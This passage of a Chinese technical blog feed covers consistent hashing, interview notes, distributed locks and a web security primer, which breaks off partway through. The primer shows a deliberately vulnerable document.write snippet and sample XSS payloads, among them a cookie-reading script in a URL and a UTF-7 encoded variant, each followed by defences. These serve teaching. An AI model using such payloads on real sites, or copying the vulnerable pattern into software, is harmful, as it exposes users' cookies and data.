      <link href="/2019/09/10/2019-09-10-%E4%B8%80%E8%87%B4%E6%80%A7hash%E7%AE%97%E6%B3%95/"/>
      <url>/2019/09/10/2019-09-10-%E4%B8%80%E8%87%B4%E6%80%A7hash%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 到底什么是Hash一致性算法 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="Redis集群的使用"><a href="#Redis集群的使用" class="headerlink" title="Redis集群的使用"></a>Redis集群的使用</h3><p>我们在使用Redis的时候，为了保证Redis的高可用，提高Redis的读写性能，最简单的方式我们会做主从复制，组成Master-Master或者Master-Slave的形式，或者搭建Redis集群，进行数据的读写分离，类似于数据库的主从复制和读写分离。如下所示：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic1.jpg"><p>同样类似于数据库，当单表数据大于500W的时候需要对其进行分库分表，当数据量很大的时候（标准可能不一样，要看Redis服务器容量）我们同样可以对Redis进行类似的操作，就是分库分表。</p><p>假设，我们有一个社交网站，需要使用Redis存储图片资源，存储的格式为键值对，key值为图片名称，value为该图片所在文件服务器的路径，我们需要根据文件名查找该文件所在文件服务器上的路径，数据量大概有2000W左右，按照我们约定的规则进行分库，规则就是随机分配，我们可以部署8台缓存服务器，每台服务器大概含有500W条数据，并且进行主从复制，示意图如下：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic2.jpg"><p>由于规则是随机的，所有我们的一条数据都有可能存储在任何一组Redis中，例如上图我们用户查找一张名称为”a.png”的图片，由于规则是随机的，我们不确定具体是在哪一个Redis服务器上的，因此我们需要进行1、2、3、4，4次查询才能够查询到（也就是遍历了所有的Redis服务器），这显然不是我们想要的结果，有了解过的小伙伴可能会想到，随机的规则不行，可以使用类似于数据库中的分库分表规则：按照Hash值、取模、按照类别、按照某一个字段值等等常见的规则就可以出来了！好，按照我们的主题，我们就使用Hash的方式。</p><h3 id="为Redis集群使用Hash"><a href="#为Redis集群使用Hash" class="headerlink" title="为Redis集群使用Hash"></a>为Redis集群使用Hash</h3><p>可想而知，如果我们使用Hash的方式，每一张图片在进行分库的时候都可以定位到特定的服务器，示意图如下：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic3.jpg"><p>上图中，假设我们查找的是”a.png”，由于有4台服务器（排除从库），因此公式为 <strong>hash(a.png) % 4 = 2</strong> ，可知定位到了第2号服务器，这样的话就不会遍历所有的服务器，大大提升了性能！</p><h3 id="使用Hash的问题"><a href="#使用Hash的问题" class="headerlink" title="使用Hash的问题"></a>使用Hash的问题</h3><p>上述的方式虽然提升了性能，我们不再需要对整个Redis服务器进行遍历！但是，使用上述Hash算法进行缓存时，会出现一些缺陷，主要体现在服务器数量变动的时候，所有缓存的位置都要发生改变！</p><p>试想一下，如果4台缓存服务器已经不能满足我们的缓存需求，那么我们应该怎么做呢？很简单，多增加几台缓存服务器不就行了！假设：我们增加了一台缓存服务器，那么缓存服务器的数量就由4台变成了5台。那么原本 <strong>hash(a.png) % 4 = 2</strong> 的公式就变成了 <strong>hash(a.png) % 5 = ？</strong> ， 可想而知这个结果肯定不是2的，这种情况带来的结果就是当服务器数量变动时，所有缓存的位置都要发生改变！换句话说，当服务器数量发生改变时，所有缓存在一定时间内是失效的，当应用无法从缓存中获取数据时，则会向后端数据库请求数据（还记得上一篇的《缓存雪崩》吗？）！</p><p>同样的，假设4台缓存中突然有一台缓存服务器出现了故障，无法进行缓存，那么我们则需要将故障机器移除，但是如果移除了一台缓存服务器，那么缓存服务器数量从4台变为3台，也是会出现上述的问题！</p><p>所以，我们应该想办法不让这种情况发生，但是由于上述Hash算法本身的缘故，使用取模法进行缓存时，这种情况是无法避免的，为了解决这些问题，Hash一致性算法（一致性Hash算法）诞生了！</p><h3 id="一致性Hash算法的神秘面纱"><a href="#一致性Hash算法的神秘面纱" class="headerlink" title="一致性Hash算法的神秘面纱"></a>一致性Hash算法的神秘面纱</h3><p>一致性Hash算法也是使用取模的方法，只是，刚才描述的取模法是对服务器的数量进行取模，而一致性Hash算法是对2^32取模，什么意思呢？简单来说，一致性Hash算法将整个哈希值空间组织成一个虚拟的圆环，如假设某哈希函数H的值空间为0-2^32-1（即哈希值是一个32位无符号整形），整个哈希环如下：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic4.jpg"><p>整个空间按顺时针方向组织，圆环的正上方的点代表0，0点右侧的第一个点代表1，以此类推，2、3、4、5、6……直到2^32-1，也就是说0点左侧的第一个点代表2^32-1， 0和2^32-1在零点中方向重合，我们把这个由2^32个点组成的圆环称为Hash环。</p><p>下一步将各个服务器使用Hash进行一个哈希，具体可以选择服务器的IP或主机名作为关键字进行哈希，这样每台机器就能确定其在哈希环上的位置，这里假设将上文中四台服务器使用IP地址哈希后在环空间的位置如下：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic5.jpg"><p>接下来使用如下算法定位数据访问到相应服务器：将数据key使用相同的函数Hash计算出哈希值，并确定此数据在环上的位置，从此位置沿环顺时针“行走”，第一台遇到的服务器就是其应该定位到的服务器！</p><p>例如我们有Object A、Object B、Object C、Object D四个数据对象，经过哈希计算后，在环空间上的位置如下：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic6.jpg"><p>根据一致性Hash算法，数据A会被定为到Node A上，B被定为到Node B上，C被定为到Node C上，D被定为到Node D上。</p><h3 id="一致性Hash算法的容错性和可扩展性"><a href="#一致性Hash算法的容错性和可扩展性" class="headerlink" title="一致性Hash算法的容错性和可扩展性"></a>一致性Hash算法的容错性和可扩展性</h3><p>现假设Node C不幸宕机，可以看到此时对象A、B、D不会受到影响，只有C对象被重定位到Node D。一般的，在一致性Hash算法中，如果一台服务器不可用，则受影响的数据仅仅是此服务器到其环空间中前一台服务器（即沿着逆时针方向行走遇到的第一台服务器）之间数据，其它不会受到影响，如下所示：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic7.jpg"><p>下面考虑另外一种情况，如果在系统中增加一台服务器Node X，如下图所示：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic8.jpg"><p>此时对象Object A、B、D不受影响，只有对象C需要重定位到新的Node X ！一般的，在一致性Hash算法中，如果增加一台服务器，则受影响的数据仅仅是新服务器到其环空间中前一台服务器（即沿着逆时针方向行走遇到的第一台服务器）之间数据，其它数据也不会受到影响。</p><p>综上所述，一致性Hash算法对于节点的增减都只需重定位环空间中的一小部分数据，具有较好的容错性和可扩展性。</p><h3 id="Hash环的数据倾斜问题"><a href="#Hash环的数据倾斜问题" class="headerlink" title="Hash环的数据倾斜问题"></a>Hash环的数据倾斜问题</h3><p>一致性Hash算法在服务节点太少时，容易因为节点分部不均匀而造成数据倾斜（被缓存的对象大部分集中缓存在某一台服务器上）问题，例如系统中只有两台服务器，其环分布如下：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic9.jpg"><p>此时必然造成大量数据集中到Node A上，而只有极少量会定位到Node B上。为了解决这种数据倾斜问题，一致性Hash算法引入了虚拟节点机制，即对每一个服务节点计算多个哈希，每个计算结果位置都放置一个此服务节点，称为虚拟节点。具体做法可以在服务器IP或主机名的后面增加编号来实现。</p><p>例如上面的情况，可以为每台服务器计算三个虚拟节点，于是可以分别计算 “Node A#1”、“Node A#2”、“Node A#3”、“Node B#1”、“Node B#2”、“Node B#3”的哈希值，于是形成六个虚拟节点：</p><img src="/2019/09/10/2019-09-10-一致性hash算法/pic10.jpg"><p>同时数据定位算法不变，只是多了一步虚拟节点到实际节点的映射，例如定位到“Node A#1”、“Node A#2”、“Node A#3”三个虚拟节点的数据均定位到Node A上。这样就解决了服务节点少时数据倾斜的问题。在实际应用中，通常将虚拟节点数设置为32甚至更大，因此即使很少的服务节点也能做到相对均匀的数据分布。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小米面经（转正）</title>
      <link href="/2019/08/27/2019-08-27-%E5%B0%8F%E7%B1%B3%E9%9D%A2%E7%BB%8F%EF%BC%88%E8%BD%AC%E6%AD%A3%EF%BC%89/"/>
      <url>/2019/08/27/2019-08-27-%E5%B0%8F%E7%B1%B3%E9%9D%A2%E7%BB%8F%EF%BC%88%E8%BD%AC%E6%AD%A3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 平平淡淡才是真 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><p>之前有问过组内以前转正的同事，听说是10月~11月号转正答辩。便想着应该也不急吧，先准备着其他的秋招。<br>结果没想到老大上个星期找我说是要我走提前批，于是转正就提上日程了。</p><ul><li>自我介绍</li><li>cookie和session</li><li>分布式存储session</li><li>TCP三次握手</li><li>TCP如何保持长连接</li><li>操作系统的存储类别（几级缓存、寄存器、内存、外存）</li><li>操作系统什么时候会出现死锁</li><li>windows和linux的区别</li><li>知道几个虚存管理的换页算法？（FIFO、LRU、CLOCK）</li><li>在实际开发中有没有用到或者借鉴到换页算法（维护百万级用户在线状态）</li><li>常见的反爬虫方法</li><li>ajax跨域问题</li><li>Golang和PHP各自的优缺点</li><li>PHP中有哪个数据结构用到了堆</li><li>堆排序、构建堆的时间复杂度、调整堆的时间复杂度</li><li>mysql用索引和不用索引的查询时间复杂度（n, logm^n）</li><li>innoDB的特性</li><li>用最少的正方形填满长a宽b的长方形（二维dp）</li><li>redis集群哈希槽</li><li>redis的灾难宕机恢复</li><li>redis设计模式的弊端</li><li>MVC的优点和缺点</li><li>用docker进行微服务架构的优势</li></ul><p>面了有50分钟吧，面试官小哥超级友好，面试体验一级棒！</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><p>一面后没多久二面就开始了，二面的面试官刚好也是我实习二面的面试官。<br>他说实习时候问了挺多了，就随便聊聊（还可以这样？），然后就真的随便聊了下。  </p><ul><li>实习感受</li><li>自我成长</li><li>最有成就感的事</li><li>对小米的认知</li><li>部门现存的问题</li><li>物质与精神</li><li>职业规划</li><li>语言的选择</li></ul><p>诸如此类吧，具体有些问题也记不清了。</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>老大说这就是走个流程，然后给我发了口头offer，说是之后还要跟我谈一下后续的事。<br>所以，未完待续？</p>]]></content>
      
      
      <categories>
          
          <category> 面经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分布式锁</title>
      <link href="/2019/07/10/2019-07-10-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"/>
      <url>/2019/07/10/2019-07-10-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 基于Reids的分布式锁 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="什么是锁？"><a href="#什么是锁？" class="headerlink" title="什么是锁？"></a>什么是锁？</h3><ul><li>在单进程的系统中，当存在多个线程可以同时改变某个变量（可变共享变量）时，就需要对代变量或代码块做同步，使其在修改这种变量时能够线性执行。</li><li>而同步的本质是通过锁来实现的。为了实现多个线程在一个时刻同一代码块只能有一个线程可执行，那么需要在某个地方做标记，这个标记必须每个线程都能看到，当标记不存在时可以设置标记，其余后续线程发现已有标记必须等待标记清除再去尝试设置。这个标记可以理解为锁。</li><li>不同地方实现线程锁的方式也不一样，只要能满足所有线程都能看得到标记即可。如java中synchronize是在对象头设置标记，Lock接口的实现类基本上都只是某一个volitile修饰的int型变量其保证灭个线程都能拥有对该int的可见性和原子修改，linux内核中也是利用互斥量或信号量等内存数据做标记。</li><li>除了利用内存数据做锁其实任何互斥的都能做锁（只考虑互斥情况），如流水表中流水号与时间结合做幂等校验可以看作是一个不会释放的锁，或者使用某个文件是否存在作为锁等。只需要满足在对标记进行修改能保证原子性和内存可见性即可。</li></ul><h3 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h3><p>此处主要指集群模式下，多个相同服务同时开启。</p><h4 id="分布式情况"><a href="#分布式情况" class="headerlink" title="分布式情况"></a>分布式情况</h4><ul><li>分布式与单机情况下最大的不同在于其不是多线程而是多进程。</li><li>多线程由于可以共享堆内存，因此可以简单的采取内存作为标记存储位置。而进程之间甚至可能都不在同一台物理机上，因此需要将标记存储在一个所有进程都能看到的地方。</li></ul><h4 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h4><blockquote><p>分布式锁是控制分布式系统或不同系统见之间访问共享资源的一种锁实现。如果不同的系统或同一个系统的不同主机之间共享了某个资源时，往往需要互斥来防止彼此干扰来保证一致性。</p></blockquote><ul><li>当在分布式模型下，数据只有一份（或有限制），此时需要利用锁的技术控制某一时刻修改数据的进程数。</li><li>与单机模式下的锁不仅需要保证进程可见，还需要考虑进程与锁之间的网络问题。</li><li>分布式锁还是可以将标记存在内存，只是该内存不是某个进程分配的内存而是公共内存如Redis、Memcache。至于利用数据库、文件等做锁与单机的实现是一样的，只要保证标记能互斥就行。</li></ul><h3 id="锁实现"><a href="#锁实现" class="headerlink" title="锁实现"></a>锁实现</h3><h4 id="基于数据库"><a href="#基于数据库" class="headerlink" title="基于数据库"></a>基于数据库</h4><p>基于数据库的锁实现也有两种方式，一是基于数据库表，另一种是基于数据库排他锁。</p><h5 id="基于数据库的增删"><a href="#基于数据库的增删" class="headerlink" title="基于数据库的增删"></a>基于数据库的增删</h5><p>基于数据库表增删是最简单的方式，首先创建一张锁的表主要包含下列字段：方法名，时间戳等字段。</p><p>具体使用的方法，当需要锁住某个方法时，往该表中插入一条相关的记录。这边需要注意，方法名是有唯一性约束的，如果有多个请求同时提交到数据库的话，数据库会保证只有一个操作可以成功，那么我们就可以认为操作成功的那个线程获得了该方法的锁，可以执行方法体内容。</p><p>执行完毕，需要delete该记录。</p><p>当然，对于上述方案可以进行优化，如应用主从数据库，数据之间双向同步。一旦挂掉快速切换到备库上；做一个定时任务，每隔一定时间把数据库中的超时数据清理一遍；使用while循环，直到insert成功再返回成功，虽然并不推荐这样做；还可以记录当前获得锁的机器的主机信息和线程信息，那么下次再获取锁的时候先查询数据库，如果当前机器的主机信息和线程信息在数据库可以查到的话，直接把锁分配给他就可以了，实现可重入锁。</p><h5 id="基于数据库排他锁"><a href="#基于数据库排他锁" class="headerlink" title="基于数据库排他锁"></a>基于数据库排他锁</h5><p>我们还可以通过数据库的排他锁来实现分布式锁。基于MySql的InnoDB引擎，可以使用以下方法来实现加锁操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span></span>&#123;</span><br><span class="line">    connection.setAutoCommit(<span class="keyword">false</span>)</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(count &lt; <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            select * from lock where lock_name=xxx <span class="keyword">for</span> update;</span><br><span class="line">            <span class="keyword">if</span>(结果不为空)&#123;</span><br><span class="line">                <span class="comment">//代表获取到锁</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//为空或者抛异常的话都表示没有获取到锁</span></span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> LockException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在查询语句后面增加for update，数据库会在查询过程中给数据库表增加排他锁。当某条记录被加上排他锁之后，其他线程无法再在该行记录上增加排他锁。其他没有获取到锁的就会阻塞在上述select语句上，可能的结果有2种，在超时之前获取到了锁，在超时之前仍未获取到锁。</p><p>获得排它锁的线程即可获得分布式锁，当获取到锁之后，可以执行方法的业务逻辑，执行完方法之后，释放锁connection.commit()。</p><p>存在的问题主要是性能不高和sql超时的异常。</p><h5 id="基于数据库锁的优缺点"><a href="#基于数据库锁的优缺点" class="headerlink" title="基于数据库锁的优缺点"></a>基于数据库锁的优缺点</h5><p>上面两种方式都是依赖数据库的一张表，一种是通过表中的记录的存在情况确定当前是否有锁存在，另外一种是通过数据库的排他锁来实现分布式锁。</p><ul><li>优点是直接借助数据库，简单容易理解。</li><li>缺点是操作数据库需要一定的开销，性能问题需要考虑。</li></ul><h4 id="基于Zookeeper"><a href="#基于Zookeeper" class="headerlink" title="基于Zookeeper"></a>基于Zookeeper</h4><p>基于zookeeper临时有序节点可以实现的分布式锁。每个客户端对某个方法加锁时，在zookeeper上的与该方法对应的指定节点的目录下，生成一个唯一的瞬时有序节点。 判断是否获取锁的方式很简单，只需要判断有序节点中序号最小的一个。 当释放锁的时候，只需将这个瞬时节点删除即可。同时，其可以避免服务宕机导致的锁无法释放，而产生的死锁问题。</p><p>提供的第三方库有curator，具体使用读者可以自行去看一下。Curator提供的InterProcessMutex是分布式锁的实现。acquire方法获取锁，release方法释放锁。另外，锁释放、阻塞锁、可重入锁等问题都可以有有效解决。讲下阻塞锁的实现，客户端可以通过在ZK中创建顺序节点，并且在节点上绑定监听器，一旦节点有变化，Zookeeper会通知客户端，客户端可以检查自己创建的节点是不是当前所有节点中序号最小的，如果是就获取到锁，便可以执行业务逻辑。</p><p>最后，Zookeeper实现的分布式锁其实存在一个缺点，那就是性能上可能并没有缓存服务那么高。因为每次在创建锁和释放锁的过程中，都要动态创建、销毁瞬时节点来实现锁功能。ZK中创建和删除节点只能通过Leader服务器来执行，然后将数据同不到所有的Follower机器上。并发问题，可能存在网络抖动，客户端和ZK集群的session连接断了，zk集群以为客户端挂了，就会删除临时节点，这时候其他客户端就可以获取到分布式锁了。</p><h4 id="基于Redis"><a href="#基于Redis" class="headerlink" title="基于Redis"></a>基于Redis</h4><p>相对于基于数据库实现分布式锁的方案来说，基于缓存来实现在性能方面会表现的更好一点，存取速度快很多。而且很多缓存是可以集群部署的，可以解决单点问题。基于缓存的锁有好几种，如memcached、redis、下面主要讲解基于redis的分布式实现。</p><h5 id="SETNX"><a href="#SETNX" class="headerlink" title="SETNX"></a>SETNX</h5><p>使用redis的SETNX实现分布式锁，多个进程执行以下Redis命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SETNX lock.id &lt;current Unix time + lock timeout + 1&gt;</span><br></pre></td></tr></table></figure><p>SETNX是将 key 的值设为 value，当且仅当 key 不存在。若给定的 key 已经存在，则 SETNX 不做任何动作。</p><ul><li>返回1，说明该进程获得锁，SETNX将键 lock.id 的值设置为锁的超时时间，当前时间 +加上锁的有效时间。</li><li>返回0，说明其他进程已经获得了锁，进程不能进入临界区。进程可以在一个循环中不断地尝试 SETNX 操作，以获得锁。</li></ul><h5 id="存在死锁的问题"><a href="#存在死锁的问题" class="headerlink" title="存在死锁的问题"></a>存在死锁的问题</h5><p>SETNX实现分布式锁，可能会存在死锁的情况。与单机模式下的锁相比，分布式环境下不仅需要保证进程可见，还需要考虑进程与锁之间的网络问题。某个线程获取了锁之后，断开了与Redis 的连接，锁没有及时释放，竞争该锁的其他线程都会hung，产生死锁的情况。</p><p>在使用 SETNX 获得锁时，我们将键 lock.id 的值设置为锁的有效时间，线程获得锁后，其他线程还会不断的检测锁是否已超时，如果超时，等待的线程也将有机会获得锁。然而，锁超时，我们不能简单地使用 DEL 命令删除键 lock.id 以释放锁。</p><p>考虑以下情况:</p><ol><li>A已经首先获得了锁 lock.id，然后线A断线。B,C都在等待竞争该锁；</li><li>B,C读取lock.id的值，比较当前时间和键 lock.id 的值来判断是否超时，发现超时；</li><li>B执行 DEL lock.id命令，并执行 SETNX lock.id 命令，并返回1，B获得锁；</li><li>C由于各刚刚检测到锁已超时，执行 DEL lock.id命令，将B刚刚设置的键 lock.id 删除，执行 SETNX lock.id命令，并返回1，即C获得锁。</li></ol><p>上面的步骤很明显出现了问题，导致B,C同时获取了锁。在检测到锁超时后，线程不能直接简单地执行 DEL 删除键的操作以获得锁。对于上面的步骤进行改进，问题是出在删除键的操作上面，那么获取锁之后应该怎么改进呢？</p><p>首先看一下redis的GETSET这个操作，GETSET key value，将给定 key 的值设为 value ，并返回 key 的旧值(old value)。利用这个操作指令，我们改进一下上述的步骤。</p><ol><li>A已经首先获得了锁 lock.id，然后线A断线。B,C都在等待竞争该锁；</li><li>B,C读取lock.id的值，比较当前时间和键 lock.id 的值来判断是否超时，发现超时；</li><li>B检测到锁已超时，即当前的时间大于键 lock.id 的值，B会执行GETSET lock.id &lt;current Unix timestamp + lock timeout + 1&gt;设置时间戳，通过比较键 lock.id 的旧值是否小于当前时间，判断进程是否已获得锁；</li><li>B发现GETSET返回的值小于当前时间，则执行 DEL lock.id命令，并执行 SETNX lock.id 命令，并返回1，B获得锁；</li><li>C执行GETSET得到的时间大于当前时间，则继续等待。</li></ol><p>在线程释放锁，即执行 DEL lock.id 操作前，需要先判断锁是否已超时。如果锁已超时，那么锁可能已由其他线程获得，这时直接执行 DEL lock.id 操作会导致把其他线程已获得的锁释放掉。</p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 分布式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见 Web 安全攻防总结</title>
      <link href="/2019/05/10/2019-05-10-%E5%B8%B8%E8%A7%81Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%80%BB%E7%BB%93/"/>
      <url>/2019/05/10/2019-05-10-%E5%B8%B8%E8%A7%81Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><i class="fa fa-quote-left"></i> 安全永远是产品的最基础需求 <i class="fa fa-quote-right"></i></p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Web 安全的对于 Web 从业人员来说是一个非常重要的课题，所以在这里总结一下 Web 相关的安全攻防知识，希望以后不要再踩雷，也希望对看到这篇文章的同学有所帮助。今天这边文章主要的内容就是分析几种常见的攻击的类型以及防御的方法。</p><blockquote><p>也许你对所有的安全问题都有一定的认识，但最主要的还是在编码设计的过程中时刻绷紧安全那根弦，需要反复推敲每个实现细节，安全无小事。<br>本文代码 Demo 都是基于 Node.js 讲解，其他服务端语言同样可以参考。</p></blockquote><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>首先说下最常见的 XSS 漏洞，XSS (Cross Site Script)，跨站脚本攻击，因为缩写和 CSS (Cascading Style Sheets) 重叠，所以只能叫 XSS。</p><p>XSS 的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。XSS 的攻击方式千变万化，但还是可以大致细分为几种类型。</p><h4 id="非持久型-XSS"><a href="#非持久型-XSS" class="headerlink" title="非持久型 XSS"></a>非持久型 XSS</h4><p>非持久型 XSS 漏洞，也叫反射型 XSS 漏洞，一般是通过给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，特有的恶意代码参数被 HTML 解析、执行。</p><img src="/2019/05/10/2019-05-10-常见Web安全攻防总结/pic1.jpg"><p>举一个例子，比如你的 Web 页面中包含有以下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Select your language:</span><br><span class="line">&lt;select&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        document.write(&apos;&apos;</span><br><span class="line">            + &apos;&lt;option value=1&gt;&apos;</span><br><span class="line">            +     location.href.substring(location.href.indexOf(&apos;default=&apos;) + 8)</span><br><span class="line">            + &apos;&lt;/option&gt;&apos;</span><br><span class="line">        );</span><br><span class="line">        document.write(&apos;&lt;option value=2&gt;English&lt;/option&gt;&apos;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><p>攻击者可以直接通过 URL 注入可执行的脚本代码。类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xx.com/xx?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>非持久型 XSS 漏洞攻击有以下几点特征：</p><ul><li>即时性，不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据。</li><li>攻击者需要诱骗点击</li><li>反馈率低，所以较难发现和响应修复</li><li>盗取用户敏感保密信息</li></ul><p>为了防止出现非持久型 XSS 漏洞，需要确保这么几件事情：</p><ul><li>Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端。</li><li>尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染。</li><li>尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法。</li><li>如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义。</li><li>前端渲染的时候对任何的字段都需要做 escape 转义编码。</li></ul><blockquote><p>escape 转义的目的是将一些构成 HTML 标签的元素转义，比如 <strong>&lt;</strong>，<strong>&gt;</strong>，<strong>空格</strong> 等，转义成 <strong>&amp;lt;</strong>，<strong>&amp;gt</strong>;，<strong>&amp;nbsp;</strong> 等显示转义字符。有很多开源的工具可以协助我们做 escape 转义。</p></blockquote><h4 id="持久型-XSS"><a href="#持久型-XSS" class="headerlink" title="持久型 XSS"></a>持久型 XSS</h4><p>持久型 XSS 漏洞，也被称为存储型 XSS 漏洞，一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。</p><p>主要注入页面方式和非持久型 XSS 漏洞类似，只不过持久型的不是来源于 URL，refferer，forms 等，而是来源于后端从数据库中读出来的数据。持久型 XSS 攻击不需要诱骗点击，黑客只需要在提交表单的地方完成注入即可，但是这种 XSS 攻击的成本相对还是很高。攻击成功需要同时满足以下几个条件：</p><ul><li>POST 请求提交表单后端没做转义直接入库。</li><li>后端从数据库中取出数据没做转义直接输出给前端。</li><li>前端拿到后端数据没做转义直接渲染成 DOM。</li></ul><p>持久型 XSS 有以下几个特点：</p><ul><li>持久性，植入在数据库中</li><li>危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡。</li><li>盗取用户敏感私密信息</li></ul><p>为了防止持久型 XSS 漏洞，需要前后端共同努力：</p><ul><li>后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理。</li><li>后端在输出给前端数据统一进行转义处理。</li><li>前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</li></ul><h4 id="基于字符集的-XSS"><a href="#基于字符集的-XSS" class="headerlink" title="基于字符集的 XSS"></a>基于字符集的 XSS</h4><p>其实现在很多的浏览器以及各种开源的库都专门针对了 XSS 进行转义处理，尽量默认抵御绝大多数 XSS 攻击，但是还是有很多方式可以绕过转义规则，让人防不胜防。比如「基于字符集的 XSS 攻击」就是绕过这些转义处理的一种攻击方式，比如有些 Web 页面字符集不固定，用户输入非期望字符集的字符，有时会绕过转义过滤规则。</p><p>以基于 utf-7 的 XSS 为例<br>utf-7 是可以将所有的 unicode 通过 7bit 来表示的一种字符集 (但现在已经从 Unicode 规格中移除)。<br>这个字符集为了通过 7bit 来表示所有的文字, 除去数字和一部分的符号,其它的部分将都以 base64 编码为基础的方式呈现。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">可以被解释为：</span><br><span class="line">+ADw-script+AD4-alert(+ACI-xss+ACI-)+ADw-/script+AD4-</span><br></pre></td></tr></table></figure><p>可以形成「基于字符集的 XSS 攻击」的原因是由于浏览器在 meta 没有指定 charset 的时候有自动识别编码的机制，所以这类攻击通常就是发生在没有指定或者没来得及指定 meta 标签的 charset 的情况下。</p><p>所以我们有什么办法避免这种 XSS 呢？</p><ul><li>记住指定 <strong>&lt;meta charset=”utf-8”&gt;</strong></li><li>XML 中不仅要指定字符集为 utf-8，而且标签要闭合</li><li>牛文推荐：<a href="http://drops.wooyun.org/papers/1327" target="_blank" rel="noopener">http://drops.wooyun.org/papers/1327</a> （这个讲的很详细）</li></ul><h4 id="基于-Flash-的跨站-XSS"><a href="#基于-Flash-的跨站-XSS" class="headerlink" title="基于 Flash 的跨站 